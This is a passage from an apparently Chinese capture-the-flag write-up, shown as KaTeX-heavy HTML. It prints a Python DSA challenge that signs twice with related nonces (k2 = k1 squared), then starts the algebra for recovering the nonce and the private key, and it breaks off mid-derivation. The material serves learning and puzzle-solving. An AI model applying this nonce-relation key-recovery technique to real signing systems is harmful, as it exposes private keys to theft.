class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> random,os<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGA&#123;***************&#125;&#x27;</span><br>msg = <span class="hljs-string">b&#x27;e = ?&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">pub, pri, k</span>):<br>    (p,q,g,y) = pub<br>    x = pri<br>    r = <span class="hljs-built_in">int</span>(powmod(g, k, p) % q)<br>    H = bytes_to_long(sha1(os.urandom(<span class="hljs-number">20</span>)).digest())<br>    s = <span class="hljs-built_in">int</span>((H + r * x) * invert(k, q) % q)<br>    <span class="hljs-keyword">return</span> (H,r,s)<br><br>k1 = getPrime(<span class="hljs-number">64</span>)<br>k2 = k1 ** <span class="hljs-number">2</span><br>pri = bytes_to_long(msg)<br>a = <span class="hljs-number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span><br>b = <span class="hljs-number">829396411171540475587755762866203184101195238207</span><br>g = <span class="hljs-number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span><br>y = <span class="hljs-number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span><br><br>pub = (a, b, g, y)<br><br>H1, r1, s1 = sign(pub, pri, k1)<br><br>H2, r2, s2 = sign(pub, pri, k2)<br><br>p = getPrime(<span class="hljs-number">128</span>)<br>q = getPrime(<span class="hljs-number">128</span>)<br>n = p * q<br>c = powmod(bytes_to_long(flag), e, n)<br><br>C = p**<span class="hljs-number">2</span> + q**<span class="hljs-number">2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;(H1, r1, s1) = <span class="hljs-subst">&#123;H1&#125;</span>, <span class="hljs-subst">&#123;r1&#125;</span>, <span class="hljs-subst">&#123;s1&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;(H2, r2, s2) = <span class="hljs-subst">&#123;H2&#125;</span>, <span class="hljs-subst">&#123;r2&#125;</span>, <span class="hljs-subst">&#123;s2&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(C)<br></code></pre></td></tr></table></figure><p>前面按照线性k的dsa正常分析</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>k</mi><mn>2</mn></msub><mo>=</mo><mi>a</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><msub><mi>k</mi><mn>1</mn></msub></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace width="1em"/><mspace width="1em"/><msub><mi>s</mi><mn>1</mn></msub><mo>=</mo><msubsup><mi>k</mi><mn>1</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><msub><mi>k</mi><mn>2</mn></msub></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace width="1em"/><mspace width="1em"/><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>k</mi><mn>2</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>签名对</mtext><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k_2=a*k_1+b\\r_1=(g^{k_1}\mod p) \mod q\quad\quad s_1=k_1^{-1}*(H_1+x*r_1)\mod q\\r_2=(g^{k_2}\mod p) \mod q\quad\quad s_2=k_2^{-1}*(H_2+x*r_2)\mod q\\签名对(r,s_1),(r,s_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">签</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">对</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mtext>的式子乘以</mtext><msub><mi>r</mi><mn>2</mn></msub><mo>:</mo><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mtext>的式子把</mtext><msub><mi>k</mi><mn>2</mn></msub><mo>=</mo><mtext>的式子带进去</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mi>a</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mi>b</mi><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mi>a</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><mi>b</mi><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>=</mo><msub><mi>H</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace><mtext>两式相减，得：</mtext><mspace linebreak="newline"></mspace><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>r</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>1</mn></msub><mo>−</mo><mi>a</mi><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>2</mn></msub><mo>−</mo><msub><mi>H</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>∗</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>到这一步后，我们知道</mtext><mi>a</mi><mo>=</mo><mi>k</mi><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mtext>所以有</mtext><mo>:</mo><mspace linebreak="newline"></mspace><msub><mi>s</mi><mn>1</mn></msub><msub><mi>r</mi><mn>2</mn></msub><msub><mi>k</mi><mn>1</mn></msub><mo>−</mo><msub><mi>r</mi><mn>1</mn></msub><msub><mi>s</mi><mn>2</mn></msub><msubsup><mi>k</mi><mn>1</mn><mn>2</mn></msubsup><mo>=</mo><msub><mi>H</mi><mn>1</mn></msub><msub><mi>r</mi><mn>2</mn></msub><mo>−</mo><msub><mi>H</mi><mn>2</mn></msub><msub><mi>r</mi><mn>1</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">s_1的式子乘以r_2:s_1*k_1*r_2=H_1*r_2+x*r_1*r_2\mod q\\\\s_2的式子把k_2=的式子带进去:\\s_2=(a*k_1+b)^{-1}*(H_2+x*r_2)\mod q\\s_2*(a*k_1+b)=H_2+x*r_2\mod q\\s_2*a*k_1+s_2*b=H_2+x*r_2\mod q\\s_2*a*k_1*r_1+s_2*b*r_1=H_2*r_1+x*r_2*r_1\mod q\\\\两式相减，得：\\k_1*(r_2*s_1-a*r_1*s_2)=H_1*r_2-H_2*r_1+b*r_1*s_2\mod q\\到这一步后，我们知道a=k,b=0,所以有:\\s_1r_2k_1-r_1s_2k_1^2=H_1r_2-H_2r_1\mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 